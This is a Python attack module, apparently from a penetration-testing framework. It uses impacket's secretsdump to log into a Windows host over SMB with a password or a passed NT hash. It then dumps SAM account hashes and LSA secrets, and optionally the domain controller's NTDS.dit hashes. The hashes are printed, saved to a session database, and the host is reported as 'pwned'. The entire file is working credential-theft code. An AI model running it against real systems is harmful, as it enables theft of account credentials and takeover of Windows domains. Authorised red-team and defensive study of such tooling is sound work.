
# scripts/smb/attack/sam_dump.py
"""
Dump SAM/LSA/NTDS.dit hashes via impacket secretsdump.
Requires admin (DA for NTDS). Saves hashes to session DB.
"""
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
    _OK = True
except ImportError:
    _OK = False


class Script(BaseScript):
    name        = "sam-dump"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Dump SAM/LSA/NTDS.dit hashes via secretsdump (impacket). "
        "Requires admin. Use --ntds for domain controller hash dump."
    )

    def run(self, **kwargs):
        if not _OK:
            console.print("[red]impacket secretsdump not available.[/red]"); return None

        ip      = self.target.ip
        domain  = self.creds.domain   or ""
        user    = self.creds.user     or ""
        passwd  = self.creds.password or ""
        nt_hash = self.creds.hash     or ""
        timeout = self.target.timeout or 5
        do_ntds = bool(kwargs.get("ntds", False))

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        console.print(f"\n[dim][sam-dump] Connecting to {ip}...[/dim]")

        hashes = []
        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, passwd, domain, lm_hash, nt_hash)

            remote_ops = RemoteOperations(conn, False, None)
            remote_ops.enableRegistry()

            try:
                boot_key = remote_ops.getBootKey()

                # SAM
                console.print("[dim][sam-dump] Dumping SAM...[/dim]")
                sam = SAMHashes(remote_ops.getHive("SAM"), boot_key, isRemote=True)
                sam.dump()
                for name, _, _, hash_str in sam.export():
                    entry = f"{name}:{hash_str}"
                    hashes.append(entry)
                    console.print(f"  [cyan]{entry}[/cyan]")
                    session_db.DB.SaveCredential(ip, name, hash_str, "ntlm", False, "sam_dump")
                sam.finish()

                # LSA secrets
                console.print("\n[dim][sam-dump] Dumping LSA secrets...[/dim]")
                lsa = LSASecrets(remote_ops.getHive("SECURITY"), boot_key,
                                  remote_ops, isRemote=True, history=False)
                lsa.dumpSecrets()
                lsa.finish()

                if do_ntds:
                    console.print("\n[dim][sam-dump] Dumping NTDS.dit (this may take a while)...[/dim]")
                    ntds = NTDSHashes(None, boot_key, isRemote=True,
                                       remoteOps=remote_ops, useVSSMethod=False,
                                       justNTLM=True)
                    ntds.dump()
                    ntds.finish()

            finally:
                remote_ops.finish()

            conn.logoff()
        except Exception as e:
            print_result("SMB", ip, "fail", f"secretsdump error: {e}"); return None

        print_result("SMB", ip, "pwned", f"{len(hashes)} hash(es) dumped from SAM")
        return hashes
